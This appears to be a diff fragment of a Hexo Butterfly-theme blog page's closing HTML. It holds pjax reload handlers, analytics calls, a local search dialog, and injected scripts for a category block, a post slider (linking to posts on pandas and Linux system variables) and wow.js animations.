+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><!-- hexo injector body_end start --> <script data-pjax>if(document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+    var parent = document.getElementById('recent-posts');
+    var child = '<div class="recent-post-item" style="width:100%;height: auto"><div id="catalog_magnet"><a class="magnet_link_more"  href="http://blog.xchstudy.org/categories" style="flex:1;text-align: center;margin-bottom: 10px;">查看更多...</a></div></div>';
+    console.log('已挂载magnet')
+    parent.insertAdjacentHTML("afterbegin",child)}
+     </script><style>#catalog_magnet{flex-wrap: wrap;display: flex;width:100%;justify-content:space-between;padding: 10px 10px 0 10px;align-content: flex-start;}.magnet_item{flex-basis: calc(50% - 5px);background: #f2f2f2;margin-bottom: 10px;border-radius: 8px;transition: all 0.2s ease-in-out;}.magnet_item:hover{background: #b30070}.magnet_link_more{color:#555}.magnet_link{color:black}.magnet_link:hover{color:white}@media screen and (max-width: 600px) {.magnet_item {flex-basis: 100%;}}.magnet_link_context{display:flex;padding: 10px;font-size:16px;transition: all 0.2s ease-in-out;}.magnet_link_context:hover{padding: 10px 20px;}</style>
+    <style></style><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/06/13/3 大数据技术/数据可视化/pandas/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://pic.chenjichao.site/raw/7.webp" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-06-13</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/06/13/3 大数据技术/数据可视化/pandas/&quot;);" href="javascript:void(0);" alt="">pandas</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/06/13/3 大数据技术/数据可视化/pandas/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/06/09/1 网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux系统变量/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://pic.chenjichao.site/raw/11.webp" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-06-09</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/06/09/1 网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux系统变量/&quot;);" href="javascript:void(0);" alt="">linux系统变量</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/06/09/1 网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux系统变量/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__bounceInLeft');
+    arr[i].setAttribute('data-wow-duration', '2s');
+    arr[i].setAttribute('data-wow-delay', '0.5s');
+    arr[i].setAttribute('data-wow-offset', '100');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__rotateInDownLeft');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '1s');
+    arr[i].setAttribute('data-wow-offset', '100');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://unpkg.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://unpkg.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><!-- hexo injector body_end end --></body></html>
